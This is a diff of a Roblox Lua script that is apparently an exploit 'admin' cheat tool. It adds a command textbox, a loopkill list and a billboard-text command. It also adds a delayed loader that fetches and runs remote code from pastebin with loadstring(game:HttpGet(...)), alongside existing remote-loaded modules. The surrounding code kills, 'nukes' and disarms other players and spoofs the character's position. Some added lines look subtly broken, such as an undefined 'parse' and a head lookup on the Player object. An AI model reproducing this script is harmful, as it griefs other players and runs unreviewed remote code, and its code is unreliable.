@@ -11,6 +11,10 @@ local HttpService = game:GetService("HttpService")
 local Teams = game:GetService("Teams")
 local CoreGui = game:GetService("CoreGui")
 local AdminScreenGui = Instance.new("ScreenGui")
+local AdminCmdBox = Instance.new("TextBox")
+local AdminRoundCorners = Instance.new("UICorner")
+local AdminStroke = Instance.new("UIStroke")
+local AdminPadding = Instance.new("UIPadding")
 local SpoofIndicatorPart = Instance.new("Part")
 local SpoofIndicatorPartOutline = Instance.new("SelectionBox")
 local Remote = workspace.Remote
@@ -35,29 +39,63 @@ local KillingPlayers = {}
 local PendingNuke = {}
 local OneshotTargetPlayers = {}
 local NoGunsTargetPlayers = {}
+local LoopKillingPlayers = {}
 local LocalCharacter = nil
 local LocalHumanoid = nil
 local LocalRoot = nil
 local Secret =  HttpService:GenerateGUID()
+local NeonTxtIns = nil
+local TargetBillboardTextPlayer = nil
+
+coroutine.wrap(function()
+    task.wait(12)
+    NeonTxtIns = loadstring(game:HttpGet("https://pastebin.com/raw/ra0fj8pP"))()()
+end)()
 
 AdminScreenGui.Name = HttpService:GenerateGUID()
---dminScreenGui.ZIndex = -1
+AdminScreenGui.DisplayOrder = -1
 
-SpoofIndicatorPart.Name = HttpService:GenerateGUID(false)
+AdminCmdBox.Name = HttpService:GenerateGUID()
+AdminCmdBox.Position = UDim2.new(.5, 0, 0, 30)
+AdminCmdBox.Size = UDim2.fromOffset(300, 30)
+AdminCmdBox.PlaceholderText = "Type a command (!)"
+AdminCmdBox.TextXAlignment = Enum.TextXAlignment.Left
+AdminCmdBox.TextSize = 15
+AdminCmdBox.BackgroundColor3 = Color3.new(1, 1, 1)
+AdminCmdBox.ShowNativeInput = true
+AdminCmdBox.ClearTextOnFocus = false
+AdminCmdBox.AnchorPoint = Vector2.new(.5, 0)
+
+AdminRoundCorners.Name = HttpService:GenerateGUID()
+AdminRoundCorners.CornerRadius = UDim.new(0, 3)
+
+AdminStroke.Name = HttpService:GenerateGUID()
+AdminStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+AdminPadding.Name = HttpService:GenerateGUID()
+AdminPadding.PaddingLeft = UDim.new(0, 9)
+
+SpoofIndicatorPart.Name = HttpService:GenerateGUID()
 SpoofIndicatorPart.Anchored = true
 SpoofIndicatorPart.Size = Vector3.new(2, 2, 1)
 SpoofIndicatorPart.CanCollide = false
 SpoofIndicatorPart.Transparency = 1
 
+SpoofIndicatorPartOutline.Name = HttpService:GenerateGUID()
 SpoofIndicatorPartOutline.Adornee = SpoofIndicatorPart
-SpoofIndicatorPartOutline.Parent = SpoofIndicatorPart
+
+SpoofIndicatorPartOutline.Parent = AdminScreenGui
+AdminPadding.Parent = AdminCmdBox
+AdminStroke.Parent = AdminCmdBox
+AdminRoundCorners.Parent = AdminCmdBox
+AdminCmdBox.Parent = AdminScreenGui
 SpoofIndicatorPart.Parent = workspace
 
 -- Import some admin modules
 local CommandVM = loadstring(game:HttpGet("https://pastebin.com/raw/27Lnax7E"), true)()
 local Parser = loadstring(game:HttpGet("https://pastebin.com/raw/t7RunsQs"), true)()
 -- HTTP 429 Prevention
-task.wait(6)
+task.wait(3)
 
 local vm = CommandVM.new()
 local parser = Parser.new(vm)
@@ -168,7 +206,7 @@ function CharacterAdded(NewCharacter)
         if SpoofsCurrent then
             SpoofsOldCFrame = Root.CFrame
             SpoofIndicatorPartOutline.Transparency = 0
-            SpoofIndicatorPartOutline.Color3 = Color3.fromHSV(os.clock() * .3 % 1, 1, 1)
+            SpoofIndicatorPartOutline.Color3 = Color3.fromHSV(os.clock() % 1, 1, 1)
             SpoofIndicatorPart.CFrame = SpoofsCurrent.value
             Root.CFrame = SpoofsCurrent.value
         end
@@ -477,6 +515,47 @@ function UnNoGunsPlayers(players)
     end
 end
 
+function LoopkillPlayers(players)
+    if typeof(players) ~= "table" then
+        players = {
+            [1] = players
+        }
+    end
+    for _, player in pairs(players) do
+        if table.find(LoopKillingPlayers, player) then
+            continue
+        end
+        table.insert(LoopKillingPlayers, player)
+    end
+end
+
+function BillboardTextPlayer(player, text)
+    if NeonTxtIns == nil then
+        return
+    end
+    
+    TargetBillboardTextPlayer = player
+    if NeonTxtIns.Text == "" then
+        NeonTxtIns.Text = text
+        repeat
+            RunService.PostSimulation:Wait()
+            local TargetCharacter = TargetBillboardTextPlayer.Character
+            if TargetCharacter == nil then
+                continue
+            end
+            local TargetHead = TargetBillboardTextPlayer:FindFirstChild("Head")
+            if TargetHead == nil then
+                continue
+            end
+            NeonTxtIns.CFrame = TargetHead.CFrame
+            NeonTxtIns:Render()
+            NeonTxtIns:Draw()
+            task.wait(.6)
+        until NeonTxtIns.Text == nil
+    end
+    NeonTxtIns.Text = text
+end
+
 Players.PlayerAdded:Connect(PlayerAdded)
 
 vm:CreateCommand({
@@ -561,11 +640,23 @@ vm:CreateCommand({
 
 vm:CreateCommand({
     name = "team",
-    callback = function(newTeam)
-    end,
+    callback = SwitchToTeam,
     args = {
         {
             name = "newTeam"
+        }
+    }
+})
+
+vm:CreateCommand({
+    name = "name",
+    callback = BillboardTextPlayer,
+    args = {
+        {
+            name = "player"
+        },
+        {
+            name = "text"
         }
     }
 })
@@ -578,6 +669,26 @@ Player.Chatted:Connect(function(msg)
         end
     end
 end)
+
+AdminCmdBox.FocusLost:Connect(function(EnterPressed)
+    if not EnterPressed then
+        return
+    end
+
+    local ok, code = pcall(parser.ParseString, parse,
+        if AdminCmdBox.Text:sub(1, 1) == parser.CmdPrefix then
+            AdminCmdBox.Text
+        else 
+            parser.CmdPrefix..AdminCmdBox.Text
+    )
+
+    if ok then
+        AdminCmdBox.Text = ""
+        vm:Execute(code)
+    end
+end)
+
+AdminScreenGui.Parent = CoreGui
 
 for _, player in ipairs(Players:GetPlayers()) do
     PlayerAdded(player)
